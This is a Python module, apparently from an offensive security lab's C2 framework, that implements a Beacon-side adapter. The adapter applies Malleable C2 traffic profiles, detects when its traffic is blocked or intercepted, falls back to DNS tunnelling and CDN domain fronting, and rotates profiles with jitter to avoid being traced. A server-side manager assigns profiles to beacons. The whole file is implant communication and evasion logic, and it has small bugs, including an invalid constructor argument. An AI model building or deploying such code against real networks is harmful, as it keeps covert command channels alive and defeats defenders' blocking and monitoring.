"""
Beacon Profile Adapter - Beacon-side profile application and adaptive switching.

This module provides the Beacon-side adapter that applies Malleable C2 Profiles
to all outbound communication, handles profile switching on C2 command,
and implements protocol-adaptive fallback (HTTP -> DNS -> HTTPS with CDN fronting).

Core capabilities:
    1. Profile application at Beacon startup and runtime
    2. Seamless profile switching on C2 command
    3. Protocol-adaptive fallback when primary protocol is blocked
    4. Interception detection and automatic profile rotation
    5. Exponential backoff retry with max 10-minute interval

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import logging
import random
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

from .malleable_profile import (
    MalleableProfile,
    ProfileStatus,
    ProtocolType,
)
from .traffic_engine import (
    ConstructedRequest,
    ConstructedResponse,
    TrafficEngine,
    TrafficTiming,
)

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class BeaconProtocolState(str, Enum):
    """Beacon communication protocol state."""

    HTTP_PRIMARY = "http_primary"
    HTTPS_PRIMARY = "https_primary"
    DNS_FALLBACK = "dns_fallback"
    WEBSOCKET = "websocket"
    CDN_FRONTING = "cdn_fronting"


class InterceptionType(str, Enum):
    """Types of network interception detected."""

    CONNECTION_RESET = "connection_reset"
    CONNECTION_TIMEOUT = "connection_timeout"
    HTTP_403 = "http_403_forbidden"
    HTTP_429 = "http_429_rate_limit"
    HTTP_502 = "http_502_bad_gateway"
    DNS_BLOCKED = "dns_blocked"
    TLS_INTERCEPTED = "tls_intercepted"
    UNKNOWN = "unknown"


@dataclass
class InterceptionEvent:
    """Record of a detected network interception.

    Attributes:
        event_type: Type of interception detected
        timestamp: When the interception occurred
        profile_name: Active profile name at time of interception
        protocol_state: Current protocol state
        retry_count: Number of retries attempted
        resolved: Whether the interception was resolved
        resolution_method: How the interception was resolved
    """

    event_type: InterceptionType = InterceptionType.UNKNOWN
    timestamp: str = ""
    profile_name: str = ""
    protocol_state: BeaconProtocolState = BeaconProtocolState.HTTP_PRIMARY
    retry_count: int = 0
    resolved: bool = False
    resolution_method: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation.

        Returns:
            Dictionary containing all interception event fields.
        """
        return {
            "event_type": self.event_type.value,
            "timestamp": self.timestamp,
            "profile_name": self.profile_name,
            "protocol_state": self.protocol_state.value,
            "retry_count": self.retry_count,
            "resolved": self.resolved,
            "resolution_method": self.resolution_method,
        }


@dataclass
class BeaconCommunicationResult:
    """Result of a Beacon communication attempt.

    Attributes:
        success: Whether the communication was successful
        response: Server response (if successful)
        error: Error message (if failed)
        interception_type: Type of interception detected (if any)
        retry_count: Number of retries performed
        duration_ms: Total communication duration in milliseconds
        profile_used: Profile name used for this communication
        protocol_state: Protocol state used
    """

    success: bool = False
    response: Optional[ConstructedResponse] = None
    error: str = ""
    interception_type: Optional[InterceptionType] = None
    retry_count: int = 0
    duration_ms: float = 0.0
    profile_used: str = ""
    protocol_state: BeaconProtocolState = BeaconProtocolState.HTTP_PRIMARY

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation.

        Returns:
            Dictionary containing all communication result fields.
        """
        return {
            "success": self.success,
            "response": self.response.to_dict() if self.response else None,
            "error": self.error,
            "interception_type": (
                self.interception_type.value if self.interception_type else None
            ),
            "retry_count": self.retry_count,
            "duration_ms": round(self.duration_ms, 2),
            "profile_used": self.profile_used,
            "protocol_state": self.protocol_state.value,
        }


# =============================================================================
# Protocol Fallback Manager
# =============================================================================

class ProtocolFallbackManager:
    """Manages protocol-adaptive fallback when primary protocol is blocked.

    Implements the fallback chain:
        HTTP -> DNS tunnel -> HTTPS (with CDN domain fronting)

    Each protocol has its own profile configuration segment.

    Attributes:
        _fallback_chain: Ordered list of protocols to try
        _current_state: Current protocol state
        _failure_counts: Per-protocol failure counts
        _max_failures_before_fallback: Failures before triggering fallback
    """

    DEFAULT_FALLBACK_CHAIN = [
        BeaconProtocolState.HTTPS_PRIMARY,
        BeaconProtocolState.DNS_FALLBACK,
        BeaconProtocolState.CDN_FRONTING,
    ]

    def __init__(
        self,
        fallback_chain: Optional[List[BeaconProtocolState]] = None,
        max_failures_before_fallback: int = 3,
    ) -> None:
        """Initialize the ProtocolFallbackManager.

        Args:
            fallback_chain: Ordered list of protocols to try (default: HTTPS -> DNS -> CDN).
            max_failures_before_fallback: Number of failures before triggering fallback.
        """
        self._fallback_chain = fallback_chain or self.DEFAULT_FALLBACK_CHAIN
        self._current_state = self._fallback_chain[0]
        self._failure_counts: Dict[BeaconProtocolState, int] = {
            state: 0 for state in self._fallback_chain
        }
        self._max_failures_before_fallback = max_failures_before_fallback

    @property
    def current_state(self) -> BeaconProtocolState:
        """Get current protocol state.

        Returns:
            Current BeaconProtocolState.
        """
        return self._current_state

    def record_success(self) -> None:
        """Record a successful communication attempt.

        Resets failure count for the current protocol.
        """
        self._failure_counts[self._current_state] = 0

    def record_failure(self) -> bool:
        """Record a failed communication attempt.

        Returns:
            True if fallback was triggered, False otherwise.
        """
        self._failure_counts[self._current_state] += 1

        if (
            self._failure_counts[self._current_state]
            >= self._max_failures_before_fallback
        ):
            return self._trigger_fallback()

        return False

    def _trigger_fallback(self) -> bool:
        """Trigger fallback to the next protocol in the chain.

        Returns:
            True if a fallback protocol is available, False if all exhausted.
        """
        current_index = self._fallback_chain.index(self._current_state)

        if current_index < len(self._fallback_chain) - 1:
            old_state = self._current_state
            self._current_state = self._fallback_chain[current_index + 1]
            logger.warning(
                f"Protocol fallback triggered: "
                f"{old_state.value} -> {self._current_state.value}"
            )
            return True

        logger.error("All fallback protocols exhausted")
        return False

    def reset(self) -> None:
        """Reset to the primary protocol."""
        self._current_state = self._fallback_chain[0]
        for state in self._failure_counts:
            self._failure_counts[state] = 0
        logger.info("Protocol fallback manager reset to primary")

    def get_protocol_type(self) -> ProtocolType:
        """Get the ProtocolType for the current state.

        Returns:
            ProtocolType corresponding to the current state.
        """
        mapping = {
            BeaconProtocolState.HTTP_PRIMARY: ProtocolType.HTTP,
            BeaconProtocolState.HTTPS_PRIMARY: ProtocolType.HTTPS,
            BeaconProtocolState.DNS_FALLBACK: ProtocolType.DNS,
            BeaconProtocolState.WEBSOCKET: ProtocolType.WEBSOCKET,
            BeaconProtocolState.CDN_FRONTING: ProtocolType.HTTPS,
        }
        return mapping.get(self._current_state, ProtocolType.HTTPS)


# =============================================================================
# Interception Detector
# =============================================================================

class InterceptionDetector:
    """Detects network interception and traffic blocking.

    Analyzes communication errors to determine if the Beacon's
    traffic is being intercepted or blocked by network security devices.

    Attributes:
        _interception_history: Recent interception events
        _max_history: Maximum history entries to keep
    """

    def __init__(self, max_history: int = 100) -> None:
        """Initialize the InterceptionDetector.

        Args:
            max_history: Maximum number of interception events to track.
        """
        self._interception_history: List[InterceptionEvent] = []
        self._max_history = max_history

    def detect(
        self,
        error: Exception,
        http_status: Optional[int] = None,
    ) -> Optional[InterceptionType]:
        """Detect interception type from communication error.

        Args:
            error: The exception raised during communication.
            http_status: HTTP status code (if available).

        Returns:
            Detected InterceptionType, or None if no interception detected.
        """
        error_str = str(error).lower()

        if "connection reset" in error_str or "ECONNRESET" in error_str:
            return InterceptionType.CONNECTION_RESET

        if "timeout" in error_str or "timed out" in error_str:
            return InterceptionType.CONNECTION_TIMEOUT

        if http_status == 403:
            return InterceptionType.HTTP_403

        if http_status == 429:
            return InterceptionType.HTTP_429

        if http_status == 502:
            return InterceptionType.HTTP_502

        if "dns" in error_str and ("refused" in error_str or "blocked" in error_str):
            return InterceptionType.DNS_BLOCKED

        if "tls" in error_str or "ssl" in error_str or "certificate" in error_str:
            return InterceptionType.TLS_INTERCEPTED

        return None

    def record_event(self, event: InterceptionEvent) -> None:
        """Record an interception event.

        Args:
            event: The interception event to record.
        """
        self._interception_history.append(event)

        if len(self._interception_history) > self._max_history:
            self._interception_history = self._interception_history[-self._max_history:]

    def get_recent_events(self, limit: int = 10) -> List[InterceptionEvent]:
        """Get recent interception events.

        Args:
            limit: Maximum number of events to return.

        Returns:
            List of recent InterceptionEvent objects.
        """
        return self._interception_history[-limit:]

    def get_interception_rate(self, window_seconds: int = 3600) -> float:
        """Calculate interception rate within a time window.

        Args:
            window_seconds: Time window in seconds.

        Returns:
            Interception rate (0.0 to 1.0).
        """
        if not self._interception_history:
            return 0.0

        cutoff = time.time() - window_seconds
        recent = [
            e for e in self._interception_history
            if self._parse_timestamp(e.timestamp) > cutoff
        ]

        return len(recent) / max(len(self._interception_history), 1)

    @staticmethod
    def _parse_timestamp(ts: str) -> float:
        """Parse ISO timestamp to Unix time.

        Args:
            ts: ISO format timestamp string.

        Returns:
            Unix timestamp as float.
        """
        try:
            return datetime.fromisoformat(ts).timestamp()
        except (ValueError, TypeError):
            return 0.0


# =============================================================================
# Profile Rotator
# =============================================================================

class ProfileRotator:
    """Manages rotation between multiple profiles for anti-trace measures.

    Supports random profile switching to avoid regular communication patterns,
    with configurable rotation intervals and profile pools.

    Attributes:
        _profile_pool: Available profiles for rotation
        _current_index: Current profile index in the pool
        _rotation_interval: Seconds between rotations
        _last_rotation: Last rotation timestamp
        _randomize_timing: Whether to randomize rotation timing
    """

    def __init__(
        self,
        rotation_interval: int = 3600,
        randomize_timing: bool = True,
    ) -> None:
        """Initialize the ProfileRotator.

        Args:
            rotation_interval: Base interval between profile rotations (seconds).
            randomize_timing: Whether to add random jitter to rotation timing.
        """
        self._profile_pool: List[MalleableProfile] = []
        self._current_index = 0
        self._rotation_interval = rotation_interval
        self._last_rotation = time.time()
        self._randomize_timing = randomize_timing

    def set_profile_pool(self, profiles: List[MalleableProfile]) -> None:
        """Set the pool of profiles available for rotation.

        Args:
            profiles: List of MalleableProfile instances to rotate through.
        """
        self._profile_pool = profiles
        self._current_index = 0
        logger.info(f"Profile rotator pool set with {len(profiles)} profiles")

    def get_current_profile(self) -> Optional[MalleableProfile]:
        """Get the currently active profile.

        Returns:
            Current MalleableProfile, or None if pool is empty.
        """
        if not self._profile_pool:
            return None
        return self._profile_pool[self._current_index]

    def should_rotate(self) -> bool:
        """Check if it's time to rotate to the next profile.

        Returns:
            True if rotation should occur, False otherwise.
        """
        if not self._profile_pool or len(self._profile_pool) <= 1:
            return False

        elapsed = time.time() - self._last_rotation

        if self._randomize_timing:
            jitter = self._rotation_interval * 0.3
            effective_interval = self._rotation_interval + random.uniform(-jitter, jitter)
        else:
            effective_interval = float(self._rotation_interval)

        return elapsed >= effective_interval

    def rotate(self) -> Optional[MalleableProfile]:
        """Rotate to the next profile in the pool.

        Returns:
            The new active MalleableProfile, or None if rotation not possible.
        """
        if not self._profile_pool or len(self._profile_pool) <= 1:
            return self.get_current_profile()

        old_name = self._profile_pool[self._current_index].name

        self._current_index = (self._current_index + 1) % len(self._profile_pool)
        self._last_rotation = time.time()

        new_name = self._profile_pool[self._current_index].name
        logger.info(f"Profile rotated: {old_name} -> {new_name}")

        return self.get_current_profile()

    def force_switch(self, profile_name: str) -> Optional[MalleableProfile]:
        """Force switch to a specific profile by name.

        Args:
            profile_name: Name of the profile to switch to.

        Returns:
            The switched-to MalleableProfile, or None if not found.
        """
        for i, profile in enumerate(self._profile_pool):
            if profile.name == profile_name:
                old_name = self._profile_pool[self._current_index].name
                self._current_index = i
                self._last_rotation = time.time()
                logger.info(f"Profile force switched: {old_name} -> {profile_name}")
                return profile

        logger.warning(f"Profile not found for force switch: {profile_name}")
        return None


# =============================================================================
# Retry Manager with Exponential Backoff
# =============================================================================

class RetryManager:
    """Manages retry logic with exponential backoff for Beacon communication.

    Implements exponential backoff with configurable base delay,
    maximum delay (10 minutes), and jitter to avoid thundering herd.

    Attributes:
        _base_delay: Base retry delay in seconds
        _max_delay: Maximum retry delay (default: 600 seconds / 10 minutes)
        _backoff_factor: Multiplier for each retry attempt
        _jitter_range: Jitter range to add randomness
    """

    def __init__(
        self,
        base_delay: float = 5.0,
        max_delay: float = 600.0,
        backoff_factor: float = 2.0,
        jitter_range: float = 0.3,
    ) -> None:
        """Initialize the RetryManager.

        Args:
            base_delay: Base retry delay in seconds.
            max_delay: Maximum retry delay (default: 600s = 10 minutes).
            backoff_factor: Multiplier for exponential backoff.
            jitter_range: Jitter range (0.0-1.0) to add randomness.
        """
        self._base_delay = base_delay
        self._max_delay = max_delay
        self._backoff_factor = backoff_factor
        self._jitter_range = jitter_range
        self._current_attempt = 0

    def get_delay(self) -> float:
        """Calculate the delay for the current retry attempt.

        Returns:
            Delay in seconds with exponential backoff and jitter.
        """
        delay = self._base_delay * (self._backoff_factor ** self._current_attempt)
        delay = min(delay, self._max_delay)

        jitter = delay * self._jitter_range * random.uniform(-1, 1)
        delay += jitter

        return max(1.0, delay)

    def record_attempt(self) -> None:
        """Record a retry attempt (increment counter)."""
        self._current_attempt += 1

    def reset(self) -> None:
        """Reset the retry counter."""
        self._current_attempt = 0

    @property
    def attempt_count(self) -> int:
        """Get current attempt count.

        Returns:
            Number of consecutive retry attempts.
        """
        return self._current_attempt


# =============================================================================
# Beacon Profile Adapter (Main Class)
# =============================================================================

class BeaconProfileAdapter:
    """Main Beacon-side adapter for Malleable C2 Profile application.

    Integrates all sub-components to provide:
        - Profile application at startup and runtime
        - Seamless profile switching on C2 command
        - Protocol-adaptive fallback (HTTP -> DNS -> HTTPS CDN fronting)
        - Interception detection and automatic profile rotation
        - Exponential backoff retry with max 10-minute interval

    Attributes:
        _traffic_engine: Traffic construction engine
        _fallback_manager: Protocol fallback manager
        _interception_detector: Network interception detector
        _profile_rotator: Profile rotation manager
        _retry_manager: Retry manager with exponential backoff
        _active_profile: Currently active profile
        _beacon_id: This Beacon's unique identifier
        _hostname: Target hostname
        _interception_callbacks: Interception event callbacks
        _profile_switch_callbacks: Profile switch callbacks
    """

    def __init__(
        self,
        beacon_id: str = "",
        hostname: str = "example.com",
        traffic_engine: Optional[TrafficEngine] = None,
    ) -> None:
        """Initialize the BeaconProfileAdapter.

        Args:
            beacon_id: Unique identifier for this Beacon.
            hostname: C2 server hostname.
            traffic_engine: Optional TrafficEngine instance (creates one if None).
        """
        self._traffic_engine = traffic_engine or TrafficEngine()
        self._fallback_manager = ProtocolFallbackManager()
        self._interception_detector = InterceptionDetector()
        self._profile_rotator = ProfileRotator()
        self._retry_manager = RetryManager()
        self._active_profile: Optional[MalleableProfile] = None
        self._beacon_id = beacon_id or f"beacon_{int(time.time())}"
        self._hostname = hostname
        self._interception_callbacks: List[Callable[..., Coroutine]] = []
        self._profile_switch_callbacks: List[Callable[..., Coroutine]] = []

    @property
    def active_profile(self) -> Optional[MalleableProfile]:
        """Get the currently active profile.

        Returns:
            Active MalleableProfile, or None if not set.
        """
        return self._active_profile

    @property
    def beacon_id(self) -> str:
        """Get the Beacon's unique identifier.

        Returns:
            Beacon ID string.
        """
        return self._beacon_id

    def set_active_profile(self, profile: MalleableProfile) -> None:
        """Set the active profile for this Beacon.

        Args:
            profile: The MalleableProfile to activate.
        """
        self._active_profile = profile
        self._traffic_engine.compile_profile(profile)
        logger.info(f"Beacon {self._beacon_id} activated profile: {profile.name}")

    def set_profile_pool(self, profiles: List[MalleableProfile]) -> None:
        """Set the pool of profiles available for rotation.

        Args:
            profiles: List of MalleableProfile instances.
        """
        self._profile_rotator.set_profile_pool(profiles)

        if not self._active_profile and profiles:
            self.set_active_profile(profiles[0])

    async def send_heartbeat(
        self,
        send_func: Callable[..., Coroutine],
        payload: Optional[bytes] = None,
    ) -> BeaconCommunicationResult:
        """Send a heartbeat request using the active profile.

        Args:
            send_func: Async function to send the HTTP request.
                       Signature: (request: ConstructedRequest) -> ConstructedResponse
            payload: Optional payload data to include in the heartbeat.

        Returns:
            BeaconCommunicationResult with success/failure details.
        """
        if not self._active_profile:
            return BeaconCommunicationResult(
                success=False,
                error="No active profile configured",
                beacon_id=self._beacon_id,
            )

        start_time = time.monotonic()

        context = {
            "beacon_id": self._beacon_id,
            "hostname": self._hostname,
            "task_id": "heartbeat",
        }

        request = self._traffic_engine.construct_request(
            profile=self._active_profile,
            payload=payload,
            context=context,
            base_url=f"https://{self._hostname}",
        )

        max_retries = self._active_profile.heartbeat.max_retry
        result = await self._execute_with_retry(send_func, request, max_retries)

        result.duration_ms = (time.monotonic() - start_time) * 1000
        result.profile_used = self._active_profile.name
        result.protocol_state = self._fallback_manager.current_state

        if result.success:
            self._retry_manager.reset()
            self._fallback_manager.record_success()
        else:
            self._retry_manager.record_attempt()
            fallback_triggered = self._fallback_manager.record_failure()

            if fallback_triggered:
                await self._handle_fallback()

        return result

    async def send_command_request(
        self,
        send_func: Callable[..., Coroutine],
        command_data: Optional[bytes] = None,
    ) -> BeaconCommunicationResult:
        """Send a command request (poll for tasks) using the active profile.

        Args:
            send_func: Async function to send the HTTP request.
            command_data: Optional command result data to send to C2.

        Returns:
            BeaconCommunicationResult with server response containing tasks.
        """
        return await self.send_heartbeat(send_func, command_data)

    async def switch_profile(self, profile_name: str) -> bool:
        """Switch to a different profile (triggered by C2 command).

        Args:
            profile_name: Name of the profile to switch to.

        Returns:
            True if the switch was successful, False otherwise.
        """
        switched_profile = self._profile_rotator.force_switch(profile_name)

        if switched_profile:
            self.set_active_profile(switched_profile)
            await self._notify_profile_switch(profile_name)
            return True

        logger.warning(f"Profile switch failed: {profile_name} not in pool")
        return False

    async def check_and_rotate_profile(self) -> Optional[str]:
        """Check if profile rotation is needed and perform it.

        Returns:
            New profile name if rotation occurred, None otherwise.
        """
        if self._profile_rotator.should_rotate():
            new_profile = self._profile_rotator.rotate()
            if new_profile:
                self.set_active_profile(new_profile)
                await self._notify_profile_switch(new_profile.name)
                return new_profile.name

        return None

    def calculate_next_heartbeat_delay(self) -> float:
        """Calculate the delay until the next heartbeat.

        Returns:
            Delay in seconds.
        """
        if not self._active_profile:
            return 60.0

        timing = self._traffic_engine.calculate_next_heartbeat(self._active_profile)
        return timing.next_request_time - time.time()

    def get_interception_events(self, limit: int = 10) -> List[InterceptionEvent]:
        """Get recent interception events.

        Args:
            limit: Maximum number of events to return.

        Returns:
            List of recent InterceptionEvent objects.
        """
        return self._interception_detector.get_recent_events(limit)

    def register_interception_callback(self, callback: Callable[..., Coroutine]) -> None:
        """Register a callback for interception events.

        Args:
            callback: Async callable receiving (event: InterceptionEvent).
        """
        self._interception_callbacks.append(callback)

    def register_profile_switch_callback(
        self, callback: Callable[..., Coroutine],
    ) -> None:
        """Register a callback for profile switch events.

        Args:
            callback: Async callable receiving (profile_name: str).
        """
        self._profile_switch_callbacks.append(callback)

    async def _execute_with_retry(
        self,
        send_func: Callable[..., Coroutine],
        request: ConstructedRequest,
        max_retries: int,
    ) -> BeaconCommunicationResult:
        """Execute a request with retry logic and interception detection.

        Args:
            send_func: Async function to send the request.
            request: The ConstructedRequest to send.
            max_retries: Maximum number of retry attempts.

        Returns:
            BeaconCommunicationResult with outcome details.
        """
        last_error: Optional[Exception] = None
        http_status: Optional[int] = None

        for attempt in range(max_retries + 1):
            try:
                response = await send_func(request)

                if isinstance(response, ConstructedResponse):
                    return BeaconCommunicationResult(
                        success=True,
                        response=response,
                        retry_count=attempt,
                    )

                return BeaconCommunicationResult(
                    success=True,
                    retry_count=attempt,
                )

            except Exception as e:
                last_error = e
                http_status = self._extract_http_status(e)

                interception_type = self._interception_detector.detect(e, http_status)

                if interception_type:
                    event = InterceptionEvent(
                        event_type=interception_type,
                        timestamp=datetime.now().isoformat(),
                        profile_name=self._active_profile.name if self._active_profile else "",
                        protocol_state=self._fallback_manager.current_state,
                        retry_count=attempt,
                    )
                    self._interception_detector.record_event(event)
                    await self._notify_interception(event)

                if attempt < max_retries:
                    delay = self._retry_manager.get_delay()
                    logger.warning(
                        f"Request failed (attempt {attempt + 1}/{max_retries + 1}), "
                        f"retrying in {delay:.1f}s: {e}"
                    )
                    await asyncio.sleep(delay)
                    self._retry_manager.record_attempt()

        return BeaconCommunicationResult(
            success=False,
            error=str(last_error) if last_error else "Unknown error",
            interception_type=self._interception_detector.detect(
                last_error or Exception(), http_status,
            ),
            retry_count=max_retries,
        )

    async def _handle_fallback(self) -> None:
        """Handle protocol fallback trigger."""
        new_state = self._fallback_manager.current_state
        logger.warning(
            f"Beacon {self._beacon_id} protocol fallback to: {new_state.value}"
        )

        if self._active_profile:
            protocol_type = self._fallback_manager.get_protocol_type()

            if protocol_type == ProtocolType.DNS:
                logger.info("Switching to DNS tunnel mode")
            elif protocol_type == ProtocolType.HTTPS:
                logger.info("Switching to HTTPS with CDN domain fronting")

    async def _notify_interception(self, event: InterceptionEvent) -> None:
        """Notify all registered interception callbacks.

        Args:
            event: The interception event to notify about.
        """
        for callback in self._interception_callbacks:
            try:
                await callback(event)
            except Exception as e:
                logger.error(f"Interception callback error: {e}")

    async def _notify_profile_switch(self, profile_name: str) -> None:
        """Notify all registered profile switch callbacks.

        Args:
            profile_name: The name of the new active profile.
        """
        for callback in self._profile_switch_callbacks:
            try:
                await callback(profile_name)
            except Exception as e:
                logger.error(f"Profile switch callback error: {e}")

    @staticmethod
    def _extract_http_status(error: Exception) -> Optional[int]:
        """Extract HTTP status code from an exception if available.

        Args:
            error: The exception to inspect.

        Returns:
            HTTP status code, or None if not available.
        """
        status = getattr(error, "status", None)
        if status:
            return int(status)

        status_code = getattr(error, "status_code", None)
        if status_code:
            return int(status_code)

        error_str = str(error)
        for code in [403, 429, 502, 503, 504]:
            if str(code) in error_str:
                return code

        return None


# =============================================================================
# C2 Server Profile Manager (Server-side)
# =============================================================================

class C2ProfileManager:
    """C2 server-side profile management and distribution.

    Manages profile assignment to Beacons, profile activation,
    and distribution of profile updates to online Beacons.

    Attributes:
        _profile_loader: Profile loader instance
        _beacon_profiles: Mapping of beacon_id to profile_name
        _group_profiles: Mapping of group_id to profile_name
        _active_profile: Globally active profile name
    """

    def __init__(self) -> None:
        """Initialize the C2ProfileManager."""
        from .malleable_profile import get_profile_loader

        self._profile_loader = get_profile_loader()
        self._beacon_profiles: Dict[str, str] = {}
        self._group_profiles: Dict[str, str] = {}
        self._active_profile: Optional[str] = None

    def assign_profile_to_beacon(
        self, beacon_id: str, profile_name: str,
    ) -> bool:
        """Assign a specific profile to a Beacon.

        Args:
            beacon_id: The Beacon's unique identifier.
            profile_name: Name of the profile to assign.

        Returns:
            True if the profile exists and was assigned.
        """
        if not self._profile_loader.get_profile(profile_name):
            logger.warning(f"Cannot assign unknown profile: {profile_name}")
            return False

        self._beacon_profiles[beacon_id] = profile_name
        logger.info(f"Assigned profile '{profile_name}' to Beacon {beacon_id}")
        return True

    def assign_profile_to_group(
        self, group_id: str, profile_name: str,
    ) -> bool:
        """Assign a profile to a Beacon group.

        Args:
            group_id: The group identifier.
            profile_name: Name of the profile to assign.

        Returns:
            True if the profile exists and was assigned.
        """
        if not self._profile_loader.get_profile(profile_name):
            return False

        self._group_profiles[group_id] = profile_name
        logger.info(f"Assigned profile '{profile_name}' to group {group_id}")
        return True

    def get_beacon_profile(self, beacon_id: str) -> Optional[MalleableProfile]:
        """Get the profile assigned to a specific Beacon.

        Args:
            beacon_id: The Beacon's unique identifier.

        Returns:
            The assigned MalleableProfile, or the active profile if no
            specific assignment exists.
        """
        profile_name = self._beacon_profiles.get(beacon_id)

        if profile_name:
            return self._profile_loader.get_profile(profile_name)

        if self._active_profile:
            return self._profile_loader.get_profile(self._active_profile)

        return self._profile_loader.get_active_profile()

    def activate_global_profile(self, profile_name: str) -> bool:
        """Activate a profile globally for all Beacons without specific assignments.

        Args:
            profile_name: Name of the profile to activate.

        Returns:
            True if the profile was activated.
        """
        if not self._profile_loader.activate_profile(profile_name):
            return False

        self._active_profile = profile_name
        logger.info(f"Global profile activated: {profile_name}")
        return True

    def get_all_assignments(self) -> Dict[str, Any]:
        """Get all profile assignments.

        Returns:
            Dictionary with beacon and group assignments.
        """
        return {
            "active_profile": self._active_profile,
            "beacon_assignments": dict(self._beacon_profiles),
            "group_assignments": dict(self._group_profiles),
            "available_profiles": list(self._profile_loader.profiles.keys()),
        }


# =============================================================================
# Global Singleton
# =============================================================================

_beacon_adapter: Optional[BeaconProfileAdapter] = None
_c2_manager: Optional[C2ProfileManager] = None


def get_beacon_adapter(
    beacon_id: str = "",
    hostname: str = "example.com",
) -> BeaconProfileAdapter:
    """Get the global BeaconProfileAdapter singleton instance.

    Args:
        beacon_id: Beacon unique identifier.
        hostname: C2 server hostname.

    Returns:
        The singleton BeaconProfileAdapter instance.
    """
    global _beacon_adapter
    if _beacon_adapter is None:
        _beacon_adapter = BeaconProfileAdapter(beacon_id, hostname)
    return _beacon_adapter


def get_c2_profile_manager() -> C2ProfileManager:
    """Get the global C2ProfileManager singleton instance.

    Returns:
        The singleton C2ProfileManager instance.
    """
    global _c2_manager
    if _c2_manager is None:
        _c2_manager = C2ProfileManager()
    return _c2_manager


__all__ = [
    "BeaconProfileAdapter",
    "C2ProfileManager",
    "ProtocolFallbackManager",
    "InterceptionDetector",
    "ProfileRotator",
    "RetryManager",
    "BeaconProtocolState",
    "InterceptionType",
    "InterceptionEvent",
    "BeaconCommunicationResult",
    "get_beacon_adapter",
    "get_c2_profile_manager",
]
